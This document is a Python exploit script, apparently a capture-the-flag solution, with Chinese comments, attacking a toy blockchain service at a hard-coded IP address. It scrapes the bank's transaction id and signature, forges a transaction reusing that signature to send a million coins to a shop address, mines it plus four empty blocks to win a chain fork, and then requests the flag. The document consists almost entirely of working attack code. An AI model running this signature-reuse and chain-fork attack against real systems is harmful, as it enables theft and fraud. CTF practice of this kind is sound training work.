import re
import json
import uuid
import hashlib
import requests
from functools import reduce

# 一堆变量常量

url_root = "http://61.147.171.105:54354"
url_create = "http://61.147.171.105:54354/create_transaction"
url_flag = "http://61.147.171.105:54354/flag"

s = requests.Session()
ddcoin = s.get(url_root)

prev_one= re.search(r"hash of genesis block: ([0-9a-f]{64})", ddcoin.text, flags = 0).group(1)
bank_utox_id= re.search(r"\"input\": \[\"([0-9a-f\-]{36})", ddcoin.text, flags = 0).group(1)
bank_signature= re.search(r"\"signature\": \[\"([0-9a-f]{96})", ddcoin.text, flags = 0).group(1)

DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0'*64

bank_addr = "b4f841897c5c65946e416444e1de2f4407c7ef5d73aea05f76016217da23199c70c9bbaa4c844a8c5c487b6633c1ecd7"
hacke_addr = "c549666e5f138f974dc278338ab6f1c0276769f97c0c621cba93528c69fb573d0d14c671195d49c3b353785a08560eed"
shop_addr = "ba0bdbe9bd6e00ecdcb8f2647a93e703990bacdcdc6e295cb0ce8a05c25c48eeb57f11948047bbf5a644ed277cafc019"

# 源码中的API

def hash(x):
    return hashlib.sha256(hashlib.md5(x.encode('utf-8')).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
    tx['hash'] = hash_tx(tx)
    return tx

def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block


# 构造的方法

def check_hash(prev,tx):
    for i in range(10000000):
        current_block = create_block(prev, str(i), tx)
        block_hash = int(current_block['hash'], 16)
        if block_hash < DIFFICULTY:
            print(json.dumps(current_block))
            return current_block

def create_feak_one():
    utxo_first = create_output_utxo(shop_addr, 1000000)
    tx_first = create_tx([bank_utox_id], [utxo_first])
    return check_hash(prev_one, [tx_first])

def create_empty_block(prev):
    return check_hash(prev, [])


# 攻击过程

a = create_feak_one()
print(s.post(url_create, data = str(json.dumps(a))).text)

b = create_empty_block(a['hash'])
print(s.post(url_create, data = str(json.dumps(b))).text)

c = create_empty_block(b['hash'])
print(s.post(url_create, data = str(json.dumps(c))).text)

d = create_empty_block(c['hash'])
print(s.post(url_create, data = str(json.dumps(d))).text)

e = create_empty_block(d['hash'])
print(s.post(url_create, data = str(json.dumps(e))).text)

print(s.get(url_flag).text)